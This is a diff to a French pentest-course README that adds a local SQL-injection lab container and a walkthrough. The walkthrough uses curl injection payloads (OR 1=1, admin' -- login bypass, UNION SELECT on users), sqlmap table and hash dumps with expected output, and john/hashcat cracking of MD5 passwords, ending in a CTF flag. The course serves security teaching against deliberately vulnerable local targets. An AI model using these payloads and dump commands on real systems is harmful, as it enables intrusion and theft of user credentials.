@@ -53,12 +53,14 @@ docker compose up -d --build
 flowchart TB
     KALI["Kali Linux (hôte)<br/>nmap · msfconsole · sqlmap · curl · nc"]
     DVWA["dvwa-target :8080<br/>XSS · CSRF · SQLi · CMDi"]
+    SQLI["sqli-app-target :8083<br/>SQLi · hash cracking"]
     VSFTPD["vsftpd-target :21, :445<br/>FTP · SMB · MySQL"]
     BOF["buffovf-target :9001<br/>Buffer overflow"]
     WAF["waf-target :8081<br/>App derrière ModSecurity"]
     SECLINUX["secure-linux-target :2222<br/>À durcir"]
     FORENSIC["forensic-victim :8082<br/>Command injection"]
     KALI -->|"localhost:8080"| DVWA
+    KALI -->|"localhost:8083"| SQLI
     KALI -->|"localhost:21"| VSFTPD
     KALI -->|"localhost:9001"| BOF
     KALI -->|"localhost:8081"| WAF
@@ -73,6 +75,12 @@ flowchart TB
 curl -I http://localhost:8080/login.php
 # → HTTP/1.1 200 OK
 # Login : admin / password → DVWA Security → low
+
+# SQLi App
+curl "http://localhost:8083/?page=search&id=1"
+# → Laptop Pro X
+curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep -o "Connecté"
+# → Connecté en tant que admin
 
 # vsftpd 2.3.4
 echo "" | nc -w2 localhost 21
@@ -430,6 +438,220 @@ ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 ```
 
 **Checkpoint :** Shell `www-data` obtenu sur netcat.
+
+---
+
+## Lab 1.5 — SQLi avancée : Trouver, Exploiter, Craquer
+
+### 📋 Fiche
+
+| Durée | Conteneur | Dossier | Techniques |
+|---|---|---|---|
+| 1h | sqli-app (port 8083) | `~/cours-hacking/jour-1/labs/` | T1190 + T1110.001 |
+
+### Contexte métier
+
+Dans un vrai pentest, 80% du temps est consacré à **trouver** l'injection avant de l'exploiter. Une fois les données exfiltrées, il faut **craquer les hashs** pour prouver l'impact au client. Ce lab vous fait faire les 3 étapes : trouver → exploiter → craquer.
+
+### Contexte technique — Les 3 types d'injection
+
+L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection différents :
+
+| Point d'injection | Type SQL | Difficile à trouver ? | Payload test |
+|---|---|---|---|
+| `?id=` (paramètre numérique) | Numeric | Facile | `1 OR 1=1` |
+| `username` (champ login) | String (single quote) | Moyen | `admin' --` |
+| `?filter=` (LIKE) | String (% wildcard) | Difficile | `%' UNION SELECT...` |
+
+**Pourquoi SQLite ?** Les principes d'injection SQL sont identiques quel que soit le SGBD. Seule la syntaxe des commandes système change (version(), @@version, sqlite_version()). SQLite permet un conteneur léger sans MySQL séparé.
+
+### Prérequis
+
+```bash
+docker compose up -d sqli-app
+curl -I http://localhost:8083/
+mkdir -p ~/cours-hacking/jour-1/labs && cd ~/cours-hacking/jour-1/labs
+```
+
+### Étape 1 — Trouver les injections manuellement
+
+**Point 1 : Paramètre `?id=` (numeric)**
+
+```bash
+# Normal
+curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
+# → Laptop Pro X
+
+# Test SQLi : toujours vrai
+curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
+# → 6 (affiche tous les produits au lieu d'un seul)
+
+# Test SQLi : toujours faux
+curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
+# → Aucun produit trouvé
+```
+
+**Point 2 : Formulaire de login (string injection)**
+
+```bash
+# Normal → échoue
+curl -s -d "page=login&username=admin&password=wrong" "http://localhost:8083/" | grep "Identifiants"
+# → ❌ Identifiants incorrects
+
+# SQLi : bypass d'authentification
+curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep "Connecté"
+# → ✅ Connecté en tant que admin
+
+# SQLi : toujours vrai
+curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localhost:8083/" | grep -c "Connecté"
+# → 6 (tous les utilisateurs sont "connectés")
+```
+
+**Point 3 : Filtre `?filter=` (LIKE injection)**
+
+```bash
+# Normal
+curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
+# → 4 (4 cellules = 1 ligne utilisateur)
+
+# SQLi : UNION pour extraire d'autres tables
+curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
+```
+
+**Checkpoint A :** Les 3 injections fonctionnent. L'application est vulnérable.
+
+### Étape 2 — Exploitation automatisée avec sqlmap
+
+```bash
+cd ~/cours-hacking/jour-1/labs
+
+# Lister les tables
+sqlmap -u "http://localhost:8083/?page=search&id=1" --tables --batch 2>&1 | tee sqli_tables.txt
+```
+
+Sortie attendue :
+
+```
+[2 tables]
++----------+
+| products |
+| users    |
++----------+
+```
+
+```bash
+# Dumper les colonnes de la table users
+sqlmap -u "http://localhost:8083/?page=search&id=1" -T users --columns --batch
+```
+
+```
+[5 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| email     | TEXT     |
+| id        | INTEGER  |
+| password  | TEXT     |
+| role      | TEXT     |
+| username  | TEXT     |
++-----------+----------+
+```
+
+```bash
+# Extraire tous les utilisateurs avec leurs hashs
+sqlmap -u "http://localhost:8083/?page=search&id=1" \
+  -T users -C username,password,email,role --dump --batch 2>&1 | tee sqli_dump.txt
+```
+
+Sortie attendue :
+
+```
++------------+----------------------------------+---------------------+------------+
+| username   | password                         | email               | role       |
++------------+----------------------------------+---------------------+------------+
+| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@shop.local    | admin      |
+| john_doe   | 482c811da5d5b4bc6d497ffa98491e38 | john@shop.local     | user       |
+| jane_dev   | e99a18c428cb38d5f260853678922e03 | jane@shop.local     | dev        |
+| supervisor | 0d107d09f5bbe40cade3de5c71e9e9b7 | super@shop.local    | supervisor |
+| guest      | 098f6bcd4621d373cade4e832627b4f6 | guest@shop.local    | user       |
+| flag_user  | 21232f297a57a5a743894a0e4a801fc3 | flag@secret.local   | admin      |
++------------+----------------------------------+---------------------+------------+
+```
+
+**Checkpoint B :** 6 utilisateurs extraits avec leurs hashs MD5.
+
+### Étape 3 — Craquer les hashs
+
+#### Méthode 1 : john the ripper
+
+```bash
+# Préparer le fichier de hashs
+cat > hashes.txt << 'EOF'
+admin:5f4dcc3b5aa765d61d8327deb882cf99
+john_doe:482c811da5d5b4bc6d497ffa98491e38
+jane_dev:e99a18c428cb38d5f260853678922e03
+supervisor:0d107d09f5bbe40cade3de5c71e9e9b7
+guest:098f6bcd4621d373cade4e832627b4f6
+flag_user:21232f297a57a5a743894a0e4a801fc3
+EOF
+
+# Crack avec john (format raw-md5)
+john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null
+john --show --format=raw-md5 hashes.txt
+```
+
+Sortie attendue :
+
+```
+admin:password
+john_doe:password123
+jane_dev:abc123
+supervisor:letmein
+guest:test
+flag_user:admin
+```
+
+#### Méthode 2 : recherche en ligne (optionnelle)
+
+```bash
+# CrackStation.net ou md5decrypt.net
+# 5f4dcc3b5aa765d61d8327deb882cf99 → password
+# e99a18c428cb38d5f260853678922e03 → abc123
+# 0d107d09f5bbe40cade3de5c71e9e9b7 → letmein
+```
+
+#### Méthode 3 : hashcat (si GPU disponible)
+
+```bash
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+**Checkpoint C :** Au moins 3 mots de passe craqués. Le flag_user utilise `admin` comme mot de passe — une erreur classique.
+
+### Étape 4 — Extraire le flag caché
+
+```bash
+# Dans la table products, un champ secret_flag existe
+sqlmap -u "http://localhost:8083/?page=search&id=1" \
+  -T products -C name,secret_flag --dump --batch
+```
+
+```
++---------------------+--------------------------------+
+| name                | secret_flag                    |
++---------------------+--------------------------------+
+| Laptop Pro X        | FLAG{sql_injection_master}     |
+| Smart Monitor 27"   | NULL                           |
+| ...                 | NULL                           |
++---------------------+--------------------------------+
+```
+
+### Checkpoints
+
+- [ ] Injection trouvée sur les 3 points d'entrée
+- [ ] sqlmap a extrait 6 utilisateurs avec hashs
+- [ ] john/hashcat a craqué au moins 3 mots de passe
+- [ ] Flag `FLAG{sql_injection_master}` trouvé
 
 ---
 
